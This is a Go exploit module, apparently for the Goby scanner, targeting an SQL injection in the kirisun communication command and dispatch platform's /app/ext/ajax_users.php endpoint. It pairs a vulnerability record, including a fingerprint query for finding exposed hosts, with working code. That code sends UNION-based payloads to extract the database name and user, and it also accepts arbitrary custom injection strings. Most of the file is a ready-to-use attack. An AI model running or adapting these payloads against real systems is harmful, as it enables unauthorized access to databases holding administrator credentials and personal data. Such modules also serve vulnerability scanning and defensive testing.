package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "kirisun Communication command and dispatch management platform /app/ext/ajax_users.php file SQL Injection Vulnerability",
    "Description": "<p>Fujian kirisun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient Q command scheduling and management solutions to help communication operators or related organizations achieve better operational efficiency and service quality. This platform provides powerful command and scheduling functions, which can monitor and manage communication network equipment, maintenance personnel, and work tasks in real time. Users can send instructions, schedule personnel, assign tasks, and obtain on-site feedback and reports in real-time through this platform. </p><p>There is an SQL injection vulnerability at the aiax users.PHP interface of Fujian kirisun Communication Command and Dispatch Management Platform. Attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator background passwords and personal information of site users), but also write Trojans to the server in high permission situations to further gain server system privileges.</p>",
    "Product": "kirisun Communication command and dispatch management platform",
    "Homepage": "https://kirisun.com.cn/",
    "DisclosureDate": "2024-05-16",
    "PostTime": "2024-05-16",
    "Author": "15900373599@163.com",
    "FofaQuery": "body=\"指挥调度管理平台\"||title=\"指挥调度管理平台\"",
    "GobyQuery": "body=\"指挥调度管理平台\"||title=\"指挥调度管理平台\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability at the aiax users.PHP interface of Fujian Kelixin Communication Command and Dispatch Management Platform. Attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator background passwords and personal information of site users), but also write Trojans to the server in high permission situations to further gain server system privileges.</p>",
    "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacksBefore accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range.3. Assign database users the minimum permissions, limited to their required operations.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "查看当前数据库名,查看用户名,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/app/ext/ajax_users.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "c4ca4238a0b923820dcc509a6f75849b",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulUrl|lastbody|variable|{{{fixedhostinfo}}}/app/ext/ajax_users.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.4",
    "Translation": {
        "CN": {
            "Name": "科立讯通信指挥调度管理平台 /app/ext/ajax_users.php 文件 SQL 注入漏洞",
            "Product": "科立讯通信指挥调度管理平台",
            "Description": "<p>福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。该产品旨在提供高效的Q 指挥调度和管理解决方案，以帮助通信运营商或相关机构实现更好的运营效率和服务质量。该平台提供强大的指挥调度功能，可以实时监控和管理通信网络设备、维护人员和工作任务等。用户可以通过该平台发送指令、调度人员、分配任务，并即时获取现场反馈和报告。<br></p><p>福建科立讯通信指挥调度管理平台 aiax users.php接囗处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>\t1.使用参数化查询可以有效防止SQL注入攻击&nbsp;</p><p>&nbsp;2.在接受用户输入之前，应该对输入数据进行验证和过滤，确保输入的数据符合预期的格式和范围。&nbsp;</p><p>&nbsp;3.将数据库用户赋予最小的权限，仅限于其所需的操作。<br></p>",
            "Impact": "<p>福建科立讯通信指挥调度管理平台 aiax users.php接囗处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "kirisun Communication command and dispatch management platform /app/ext/ajax_users.php file SQL Injection Vulnerability",
            "Product": "kirisun Communication command and dispatch management platform",
            "Description": "<p>Fujian kirisun Communication Command and Dispatch Management Platform is a management platform specifically designed for the communication industry. This product aims to provide efficient Q command scheduling and management solutions to help communication operators or related organizations achieve better operational efficiency and service quality. This platform provides powerful command and scheduling functions, which can monitor and manage communication network equipment, maintenance personnel, and work tasks in real time. Users can send instructions, schedule personnel, assign tasks, and obtain on-site feedback and reports in real-time through this platform.&nbsp;</p><p>There is an SQL injection vulnerability at the aiax users.PHP interface of Fujian kirisun Communication Command and Dispatch Management Platform. Attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator background passwords and personal information of site users), but also write Trojans to the server in high permission situations to further gain server system privileges.<br></p>",
            "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacksBefore accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range.3. Assign database users the minimum permissions, limited to their required operations.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability at the aiax users.PHP interface of Fujian Kelixin Communication Command and Dispatch Management Platform. Attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator background passwords and personal information of site users), but also write Trojans to the server in high permission situations to further gain server system privileges.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`
	sqlInjectionXh1xawdw := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		httpConfig := httpclient.NewPostRequestConfig("/app/ext/ajax_users.php")
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
		httpConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		body := sqlPayload
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "usr") {
			reMsg := regexp.MustCompile("~(.*?)~")
			matchesMsg := reMsg.FindStringSubmatch(resp.Utf8Html)
			if len(matchesMsg) > 1 {

				return matchesMsg[1]
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var msg string
			var sqlPayload string
			if attackType == "查看当前数据库名" {
				sqlPayload = "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,database(),0x7e),NULL,NULL,NULL-- -"
				msg = sqlInjectionXh1xawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else if attackType == "查看用户名" {
				sqlPayload = "dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,user(),0x7e),NULL,NULL,NULL-- -"
				msg = sqlInjectionXh1xawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "custom" {
				sqlPayload = custom
				msg = sqlInjectionXh1xawdw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "sqlPoint" {
				expResult.Output = "POST /app/ext/ajax_users.php HTTP/1.1\nHost: {{file:line(D:\\work\\yakit\\Yakit\\yakit-projects\\temp\\tmp3902287144.txt)}}\nUser-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info\nContent-Type: application/x-www-form-urlencoded\n\ndep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -"
				expResult.Success = true
				return expResult
			} else {
				expResult.Output = "未知的攻击方式！"
			}
			expResult.Success = true
			expResult.Output = sqlPayload + ":" + msg
			return expResult
		},
	))
}